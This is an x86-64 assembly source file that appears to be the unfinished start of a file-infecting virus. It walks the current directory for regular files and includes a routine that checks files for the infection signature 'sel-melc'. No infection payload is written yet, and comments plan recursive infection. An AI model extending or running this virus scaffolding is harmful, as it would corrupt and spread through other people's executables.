;let's do this

global _start

_start:
	push 0x0000002e; our target directory here "."
	lea rdi, [rsp]
	call list_files
	sub rsp, 8

exit_prog:
	mov	rax, 0x3c;
	mov rdi, 1
	syscall

;this will simply print a newline
debug:
	push rbx
	push rcx
	push r8
	push r9
	push r10
	push rax
	push rsi
	push rdx
	push rdi

	mov rax, 1
	push 0x0000000a
	lea rsi, [rsp]
	mov rdx, 2
	mov rdi, 1
	syscall
	add rsp, 8
	pop rdi
	pop rdx
	pop rsi
	pop rax
	pop r10
	pop r9
	pop r8
	pop rcx
	pop rbx
retn

ft_strlen:
	xor rax, rax
	loop:
		cmp byte[rdi + rax], 0
		je strlen_exit
		inc rax
		jmp loop
	strlen_exit:
retn

%define REGULAR_FILE 8
%define DIRECTORY_FILE 4
list_files:
	sub rsp, 1024;this is gonna be our buffer
	sub rsp, 4; fd
	mov rsi, 65536; O_RDONLY | O_DIRECTORY
	xor rdx, rdx
	mov rax, 2; sycall open
	syscall
	cmp rax, -1
	je exit_prog ;open error
 	mov [rsp], rax
	dir_read_loop:
		mov rdi, [rsp];fd of dir
		lea rsi, [rsp + 4]; addr of buffer
		mov rdx, 1024;reading max 1024 bytes
		mov rax, 217;getdents64 syscall
		syscall
		cmp rax, -1
		je exit_prog;getdents64 err
		cmp rax, 0
		je dir_read_exit; done reading dir
		mov r10, rax; store number bytes read
		xor rcx, rcx; will serve as index to parse files
		parse_file_loop:
			mov r8, rsi; save rsi
			lea r9, [rsi + rcx] ; current linux_dirent64*
			lea rsi, [r9 + 19];filename
			cmp byte[r9 + 18], 	REGULAR_FILE ; [r9 +18] is file type
			jne skip_file
			;later add here directory handle for recursive infection
			mov rdi, rsi; pass fname as arg
			call famine_file ; void famine_file(char * fname);
			skip_file: 
			mov rsi, r8
			xor rdx, rdx
			mov dx, WORD[r9 + 16] ;len of current linux_dirent64*
			add rcx, rdx
			cmp rcx, r10
			jae parse_file_exit
			jmp parse_file_loop
		parse_file_exit: 
		jmp dir_read_loop
	dir_read_exit:
	add rsp, 4
	add rsp,1024
retn


famine_file:
	push rbx
	push rcx
	push r8
	push r9
	push r10
	push rax
	push rsi
	push rdx
	push rdi


	sub rsp, 4 ;fd

	call open_file
	mov [rsp], rax;stock fd
;	call check_already_infected ; int check_already_infected(int fd)

	mov rax, 3 ; close syscall n.
	mov rdi, [rsp] ; close(fd)
	syscall

	add rsp, 4
	pop rdi
	pop rdx
	pop rsi
	pop rax
	pop r10
	pop r9
	pop r8
	pop rcx
	pop rbx
retn

open_file:
	xor rsi, rsi
	xor rdx, rdx
	mov rax, 2
	syscall
retn

;we're gonna check if file already contains the signature
check_already_infected:
	push rdi
	push rsi
	push rcx
	push rdx

	call open_file
	mov rdi, rax; store fd in rdi
	sub rsp, 1
	mov rcx, 0x636c656d2d6c6573 ; "sel-melc"
	push rcx
	xor rcx, rcx
	loop_cai:
		lea rsi, [rsp + 9]
		mov rdx, 1; read one byte at the time
		mov rax, 0
		syscall; read(rdi, rsi, rdx);
		cmp rax, 0
		je end_of_cai
		mov dl, [rsp + rcx]
		cmp byte[rsp + 9], dl
		jne reset_rcx_cai
		inc rcx
		cmp rcx, 8 ;sel-melc 8 bytes long
		je cai_found
		jmp loop_cai
		reset_rcx_cai:
			xor rcx, rcx
			jmp loop_cai
	cai_not_found:
		mov rax, 0
		jmp end_of_cai
	cai_found :
		mov rax, 1
	end_of_cai:
		add rsp, 9
		push rax;save return val
		mov rax, 3
		syscall
		pop rax;restore return val
	
	pop rdx
	pop rcx
	pop rsi
	pop rdi
retn
